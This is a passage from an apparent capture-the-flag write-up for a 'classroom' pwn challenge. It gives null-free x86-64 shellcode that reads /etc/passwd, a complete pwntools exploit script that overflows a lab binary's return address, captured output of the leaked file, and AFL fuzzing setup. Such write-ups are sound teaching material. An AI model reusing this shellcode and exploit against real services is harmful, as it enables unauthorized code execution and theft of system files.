  40103c:       48 31 ff                xor    rdi,rdi
  40103f:       0f 05                   syscall

Disassembly of section .data:

0000000000402000 <filename>:
  402000:       2f                      (bad)
  402001:       65 74 63                gs je  402067 <_end+0x57>
  402004:       2f                      (bad)
  402005:       70 61                   jo     402068 <_end+0x58>
  402007:       73 73                   jae    40207c <_end+0x6c>
  402009:       77 64                   ja     40206f <_end+0x5f>
  40200b:       00                      .byte 0
~/D/W/b/pwn $ 
```

Let's rework it. What we are doing here is first moving the filename string to the .text section, writting it to the stack, and then poping it to a register. 
Also, we include an XOR operation to recover a null byte and properly terminate the filename string.

```c
push 0x00647773 ^ 0x41414141        ; we are pushing "/etc/passwd%00" (backwords due to endianess) ; here "%00dws" XORed with "AAAA";  
xor dword [rsp], 0x41414141         ; we are XORing the pushed value with "AAAA" to get "%00dws" back on stack
mov r14, 0x7361702f6374652f         ; we are moving "/etc/pas" to $r14 
push r14                            ; and pushing it on the stack, 
                                    ; essentially reconstructing the string "/etc/passwd%00" at the address pointed to by $rsp
```

Additionally, we are substituting op codes that include null bytes to null free equivelants, for example:

```bash
~ $ pwn asm -c amd64 "mov eax,0x2"              # FROM
b802000000
~ $ pwn asm -c amd64 "xor rax, rax; mov al, 2"  # TO
4831c0b002
~ $ 
```

Evantually we can get to something like the below:

```c
; nasm -f elf64 open-read-write.asm -o open-read-write.o ; ld open-read-write.o -o open-read-write

section .text
    global _start

_start:
    ; Open the file (sys_open) 
    ; int open(const char *pathname, int flags, ... /* mode_t mode */ ); <-- $rdi = filename , $rsi = flags
    push 0x00647773 ^ 0x41414141        ; we are pushing "/etc/passwd%00" backwords due to endianess ; here "%00dws" XORed with "AAAA";  
    xor dword [rsp], 0x41414141         ; we are XORing the pushed value with "AAAA" to get "%00dws" back on stack
    mov r14, 0x7361702f6374652f         ; we are moving "/etc/pas" to $r14 
    push r14                            ; and pushing it on the stack, 
                                        ; essentially reconstructing the string "/etc/passwd%00" at the address pointed to by $rsp
    xor rax, rax                        ; nullyfing $rax
    mov al, 2                           ; syscall number for sys_open (2)
    mov rdi, rsp                        ; filename to rdi
    xor rsi, rsi                        ; flags (O_RDONLY = 0)
    syscall
    mov rbx, rax                        ; store file descriptor in rbx

    ; Read the file (sys_read)
    ; ssize_t read(int fd, void buf[.count], size_t count);  <-- $rdi = file descriptor from $rbx, $rsi = where to read into, $rdx = # bytes
    xor rax, rax                         ; syscall number for sys_read (0)
    mov rdi, rbx                         ; file descriptor
    mov rsi, rsp                         ; buffer to read into
    xor rdx, rdx                         ; rdx 0 
    mov dx, 300                          ; number of bytes to read
    syscall

    ; Write the buffer to stdout (sys_write)
    ; ssize_t write(int fd, const void buf[.count], size_t count);  <-- $rdi = stdout, $rsi = buffer to write from, $rdx = #bytes
    xor rax, rax 
    inc al                              ; syscall number for sys_write (1)
    mov dil, 1                          ; file descriptor (stdout)
    ;   mov rsi, rsp                    ; buffer to write from (already there from read())
    ;   mov rdx, rbx                    ; number of bytes to write (already there from read())
    syscall

    ; Exit the program (sys_exit)
    ; [[noreturn]] void _exit(int status);  <-- $rdi = τα ειπαμε
    xor rax, rax
    mov al, 60                          ; syscall number for sys_exit (3c)
    xor rdi, rdi                        ; exit code 0
    syscall

```

Which allows us to produce null-free shellcode:

```c
~/D/W/b/pwn $ objdump -Mintel -D -z open-read-write 

open-read-write:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       68 32 36 25 41          push   0x41253632
  401005:       81 34 24 41 41 41 41    xor    DWORD PTR [rsp],0x41414141
  40100c:       49 be 2f 65 74 63 2f    movabs r14,0x7361702f6374652f
  401013:       70 61 73 
  401016:       41 56                   push   r14
  401018:       48 31 c0                xor    rax,rax
  40101b:       b0 02                   mov    al,0x2
  40101d:       48 89 e7                mov    rdi,rsp
  401020:       48 31 f6                xor    rsi,rsi
  401023:       0f 05                   syscall
  401025:       48 89 c3                mov    rbx,rax
  401028:       48 31 c0                xor    rax,rax
  40102b:       48 89 df                mov    rdi,rbx
  40102e:       48 89 e6                mov    rsi,rsp
  401031:       48 31 d2                xor    rdx,rdx
  401034:       66 ba 2c 01             mov    dx,0x12c
  401038:       0f 05                   syscall
  40103a:       48 31 c0                xor    rax,rax
  40103d:       fe c0                   inc    al
  40103f:       40 b7 01                mov    dil,0x1
  401042:       0f 05                   syscall
  401044:       48 31 c0                xor    rax,rax
  401047:       b0 3c                   mov    al,0x3c
  401049:       48 31 ff                xor    rdi,rdi
  40104c:       0f 05                   syscall
~/D/W/b/pwn $ 
```

We'll use [Shellcode-Extractor](https://github.com/Neetx/Shellcode-Extractor) to extract the bytecode out of the object file and test it.

```bash
~/D/W/b/pwn $ objdump -d open-read-write.o | python3 shellcode_extractor.py 

\x68\x32\x36\x25\x41\x81\x34\x24\x41\x41\x41\x41\x49\xbe\x2f\x65\x74\x63\x2f\x70\x61\x73\x41\x56\x48\x31\xc0\xb0\x02\x48\x89\xe7\x48\x31\xf6\x0f\x05\x48\x89\xc3\x48\x31\xc0\x48\x89\xdf\x48\x89\xe6\x48\x31\xd2\x66\xba\x2c\x01\x0f\x05\x48\x31\xc0\xfe\xc0\x40\xb7\x01\x0f\x05\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05

Lenght: 78

~/D/W/b/pwn $ gcc shellcode_tester.c
~/D/W/b/pwn $ ./a.out 
root@wildwest:/opt/Shellcode-Extractor# ./a.out               
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:                                                                                                                                                                                                    
```

As a final step we'll update `sploit.py` with the shellcode and the length

```python
shellcode = b'\x68\x32\x36\x25\x41\x81\x34\x24\x41\x41\x41\x41\x49\xbe\x2f\x65\x74\x63\x2f\x70\x61\x73\x41\x56\x48\x31\xc0\xb0\x02\x48\x89\xe7\x48\x31\xf6\x0f\x05\x48\x89\xc3\x48\x31\xc0\x48\x89\xdf\x48\x89\xe6\x48\x31\xd2\x66\xba\x2c\x01\x0f\x05\x48\x31\xc0\xfe\xc0\x40\xb7\x01\x0f\x05\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05'

payload1 = fit({
    0: shellcode
    }, filler=b'\x90', length=78)
print(hexdump(payload1))
```

And run it, for one last time.

```bash 
~/D/W/b/pwn $ python3 sploit.py DEBUG
[*] '/home/kidd/Desktop/WORK/bsides24/pwn/classroom'
...[snip]...
[+] Opening connection to 192.168.13.37 on port 8000: Done
[*] Paused (press any to continue)
[DEBUG] Received 0x7e bytes:
    00000000  4b 69 64 73  20 6d 75 73  74 20 66 6f  6c 6c 6f 77  │Kids│ mus│t fo│llow│
    00000010  20 74 68 65  20 72 75 6c  65 73 21 0a  31 2e 20 4e  │ the│ rul│es!·│1. N│
    00000020  6f 20 63 68  65 61 74 69  6e 67 21 20  20 20 e2 9d  │o ch│eati│ng! │  ··│
    00000030  8c 0a 32 2e  20 4e 6f 20  73 77 65 61  72 69 6e 67  │··2.│ No │swea│ring│
    00000040  21 20 20 20  e2 9d 8c 0a  33 2e 20 4e  6f 20 f0 9f  │!   │····│3. N│o ··│
    00000050  9a a9 20 73  68 61 72 69  6e 67 21 20  e2 9d 8c 0a  │·· s│hari│ng! │····│
    00000060  0a 49 73 20  65 76 65 72  79 74 68 69  6e 67 20 63  │·Is │ever│ythi│ng c│
    00000070  6c 65 61 72  3f 20 28 79  2f 6e 29 0a  3e 20        │lear│? (y│/n)·│> │
    0000007e
[DEBUG] Sent 0x4f bytes:
    00000000  68 32 36 25  41 81 34 24  41 41 41 41  49 be 2f 65  │h26%│A·4$│AAAA│I·/e│
    00000010  74 63 2f 70  61 73 41 56  48 31 c0 b0  02 48 89 e7  │tc/p│asAV│H1··│·H··│
    00000020  48 31 f6 0f  05 48 89 c3  48 31 c0 48  89 df 48 89  │H1··│·H··│H1·H│··H·│
    00000030  e6 48 31 d2  66 ba 2c 01  0f 05 48 31  c0 fe c0 40  │·H1·│f·,·│··H1│···@│
    00000040  b7 01 0f 05  48 31 c0 b0  3c 48 31 ff  0f 05 0a     │····│H1··│<H1·│···│
    0000004f
[DEBUG] Received 0x32 bytes:
    b'\n'
    b'Alright! Do you have any more questions? (y/n)\n'
    b'> '
...[snip]...
    b'Enough questions for today class...\n'
    b'Well, maybe a last one and then we finish!\n'
    b'> '
[DEBUG] Sent 0x190 bytes:
    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000080  90 90 90 90  90 90 90 90  0c 09 40 00  00 00 00 00  │····│····│··@·│····│
    00000090  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000190
[+] Receiving all data: Done (358B)
[DEBUG] Received 0x3a bytes:
    00000000  57 68 61 74  20 61 72 65  20 79 6f 75  20 64 6f 69  │What│ are│ you│ doi│
    00000010  6e 67 20 68  65 72 65 3f  21 20 4b 69  64 73 20 61  │ng h│ere?│! Ki│ds a│
    00000020  72 65 20 6e  6f 74 20 61  6c 6c 6f 77  65 64 20 68  │re n│ot a│llow│ed h│
    00000030  65 72 65 21  20 f0 9f 94  9e 0a                     │ere!│ ···│··│
    0000003a
[DEBUG] Received 0x12c bytes:
    b'root:x:0:0:root:/root:/bin/bash\n'
    b'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n'
    b'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n'
    b'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n'
    b'sync:x:4:65534:sync:/bin:/bin/sync\n'
    b'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n'
    b'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n'
    b'lp:x:7:7:lp:/va'
[*] Closed connection to 192.168.13.37 port 8000
/home/kidd/.local/lib/python3.11/site-packages/pwnlib/log.py:347: BytesWarning: Bytes is not text; assuming UTF-8, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'success')
[+] What are you doing here?! Kids are not allowed here! 🔞
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/va
~/D/W/b/pwn $ 
```

Excellent!

# Outro

If you made it this far thank you for staying :)

There are two optional parts that you may enjoy as well exactly below.

## Pwntools again

Pwntools is such a versatile tool. Using `shellcraft` it allows us to create shellcode using abstracted notations instead of assembly, which, arguably, is way less convinient. 

For example, one could recreate the above shellcode using pwnlib. Crafting and testing the shellcode listed above would be as simple as:

```python
~/D/W/b/pwn $ ipython3
Python 3.11.9 (main, Apr 10 2024, 13:16:36) [GCC 13.2.0]
Type 'copyright', 'credits' or 'license' for more information
IPython 8.20.0 -- An enhanced Interactive Python. Type '?' for help.

In [1]: from pwn import *                                                        # import the library
   ...: context(arch='amd64', os='linux', endian='little', word_size=64)         # setting the execution context 
   ...: context.log_level = 'debug'
   ...: #p = run_shellcode(asm(pwnlib.shellcraft.amd64.readfile("/etc/passwd", 2)))
   ...: p = run_shellcode(
   ...:   asm(                                                                   # we need to assembly the following opcodes
   ...:     shellcraft.pushstr("/etc/passwd") +                                  # push the filname to the stack
   ...:     shellcraft.mov('rdi', 'rsp') +                                       # copy the rsp addy to the rdi
   ...:     shellcraft.syscall('SYS_open', 'rdi', 0) +                           # call open() with arguments
   ...:     shellcraft.mov('rbx', 'rax') +                                       # store file descriptor                
   ...:     shellcraft.syscall('SYS_read', 'rbx', 'rsp', 300) +                  # call read() with arguments
   ...:     shellcraft.syscall('SYS_write', '1', 'rsi', 300) +                   # call write() with arguments
   ...:     shellcraft.syscall('SYS_exit', '0')))                                # be seeing 'ya
   ...: p.recvall()                                                              # receive all process output
[DEBUG] cpp -C -nostdinc -undef -P -I/home/kidd/.local/lib/python3.11/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        /* push b'/etc/passwd\x00' */
        push 0x1010101 ^ 0x647773
        xor dword ptr [rsp], 0x1010101
        mov rax, 0x7361702f6374652f
        push rax
        mov rdi, rsp
        /* call open('rdi', 0) */
        push 2 /* 2 */
        pop rax
        xor esi, esi /* 0 */
        syscall
        mov rbx, rax
        /* call read('rbx', 'rsp', 0x12c) */
        xor eax, eax /* SYS_read */
        mov rdi, rbx
        xor edx, edx
        mov dx, 0x12c
        mov rsi, rsp
        syscall
        /* call write('1', 'rsi', 0x12c) */
        push 1 /* 1 */
        pop rax
        push (1) /* 1 */
        pop rdi
        xor edx, edx
        mov dx, 0x12c
        syscall
        /* call exit('0') */
        push 60 /* 0x3c */
        pop rax
        xor edi, edi /* (0) */
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-uu_n8ey0/step2 /tmp/pwn-asm-uu_n8ey0/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-uu_n8ey0/step3 /tmp/pwn-asm-uu_n8ey0/step4
[DEBUG] Building ELF:
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
    .string "\x68\x72\x76\x65\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x2f\x65\x74\x63\x2f\x70\x61\x73\x50\x48\x89\xe7\x6a\x02\x58\x31\xf6\x0f\x05\x48\x89\xc3\x31\xc0\x48\x89\xdf\x31\xd2\x66\xba\x2c\x01\x48\x89\xe6\x0f\x05\x6a\x01\x58\x6a\x01\x5f\x31\xd2\x66\xba\x2c\x01\x0f\x05\x6a\x3c\x58\x31\xff\x0f\x05"
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-5d8c563a/step2-obj /tmp/pwn-asm-5d8c563a/step1-asm
[DEBUG] /usr/bin/x86_64-linux-gnu-ld --oformat=elf64-x86-64 -EL -z execstack --no-warn-execstack --no-warn-rwx-segments -o /tmp/pwn-asm-5d8c563a/step3-elf /tmp/pwn-asm-5d8c563a/step2-obj
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -Sg /tmp/pwn-asm-5d8c563a/step3-elf
[DEBUG] /usr/bin/x86_64-linux-gnu-strip --strip-unneeded /tmp/pwn-asm-5d8c563a/step3-elf
[DEBUG] '/tmp/pwn-asm-5d8c563a/step3-elf' is statically linked, skipping GOT/PLT symbols
[*] '/tmp/pwn-asm-5d8c563a/step3-elf'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
[x] Starting local process '/tmp/pwn-asm-5d8c563a/step3-elf'
[+] Starting local process '/tmp/pwn-asm-5d8c563a/step3-elf': pid 6550
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process '/tmp/pwn-asm-5d8c563a/step3-elf' stopped with exit code 0 (pid 6550)
[DEBUG] Received 0x12c bytes:
    b'root:x:0:0:root:/root:/usr/bin/zsh\n'
    b'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n'
    b'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n'
    b'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n'
    b'sync:x:4:65534:sync:/bin:/bin/sync\n'
    b'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n'
    b'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n'
    b'lp:x:7:7:lp:'
[x] Receiving all data: 300B
[+] Receiving all data: Done (300B)
Out[1]: b'root:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:'
```

Updating `sploit.py` we get:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 192.168.13.37 --port 8000 ./classroom
from pwn import *

# context.log_level = 'debug'

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './classroom')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '192.168.13.37'
port = int(args.PORT or 8000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        # return process('strace ./classroom', shell=True)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

# shellcode = '' # shellcode placeholder
# shellcode = asm(pwnlib.shellcraft.amd64.readfile("/etc/passwd", 2))
# shellcode = b'\x68\x32\x36\x25\x41\x81\x34\x24\x41\x41\x41\x41\x49\xbe\x2f\x65\x74\x63\x2f\x70\x61\x73\x41\x56\x48\x31\xc0\xb0\x02\x48\x89\xe7\x48\x31\xf6\x0f\x05\x48\x89\xc3\x48\x31\xc0\x48\x89\xdf\x48\x89\xe6\x48\x31\xd2\x66\xba\x2c\x01\x0f\x05\x48\x31\xc0\xfe\xc0\x40\xb7\x01\x0f\x05\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05'
shellcode = asm(
    shellcraft.pushstr("/etc/passwd") +
    shellcraft.mov('rdi', 'rsp') +
    shellcraft.syscall('SYS_open', 'rdi', 0) + 
    shellcraft.mov('rbx', 'rax') + # store file descriptor
    shellcraft.syscall('SYS_read', 'rbx', 'rsp', 300) + 
    shellcraft.syscall('SYS_write', '1', 'rsi', 300) + 
    shellcraft.syscall('SYS_exit', '0')
)

payload1 = fit({
    0: shellcode
    }, filler=asm(shellcraft.nop()), length=78)
print(hexdump(payload1))

payload2 = fit({
    136: p64(0x40090c)
    }, filler=asm(shellcraft.nop()), length=400)
print(hexdump(payload2))

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

pause()

io.recvuntil(b'> ')    # receive everything until prompt
io.sendline(payload1)  # send payload1 at the `Is everything clear? (y/n)` question
io.recvuntil(b'> ')    # continue receiving and sending data until the 5th question 
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')
io.sendline(b'y')
io.recvuntil(b'> ')    # `Well, maybe a last one and then we finish!` prompt
io.send(payload2)      # send payload2
flag = io.recvall()
log.success(flag)

#io.interactive()
```
And here is a full run in all it's glory.
<div id="sploit"></div>
<script>AsciinemaPlayer.create('/assets/cast/classroom.sploit.cast', document.getElementById('sploit'));</script>

## Fuzzing with AFL

Now, say that you are absolutely not gonna bother with trying to find the crash. Just ain't. Allergic to ghidra kind of attitude. 

You can use [AFLplusplus](https://github.com/AFLplusplus/AFLplusplus) to help you fuzz the binary and identify input that leads to interesting paths. 

[Setting it up](https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/INSTALL.md) these days is really straight forward, or you can use a simple `docker pull aflplusplus/aflplusplus:latest`. 
In any case, for black-box fuzzing, which we will be performing, you are going to need to build `qemu` support using `/AFLplusplus/qemu_mode/build_qemu_support.sh`. 

You'll also need to pull the binary in the container, and create the appropriate directory structure (in/out).

What you can also do is build interesting input files for AFL. Although we can go literally nuts here, we will try to keep it simple. 

First, create some test files of variable length (from 1 to 500).

```bash
for((i=0;i<=500;i+=64)); do python3 -c "print('A'* $i )" | tee ./in/crash-AAAA-$i ; done
```

In addition, and to speed things up, knowing that the binary accepts a bunch of `y`s initially, we can make an educated guess and create some input files that can assist AFL to find interesting paths faster. 

```bash
for((i=0;i<=500;i+=64)); do python3 -c "print('y'* $i )" | tee ./in/crash-yyyy-$i ; done
```

Running AFLplusplus should result in usable crash cases almost instantly. As in, for example, in the screencast below where we are having 5 usable crashe cases in less that 30".

<div id="afl"></div>
<script>AsciinemaPlayer.create('/assets/cast/classroom.afl.cast', document.getElementById('afl'));</script>

# EOF
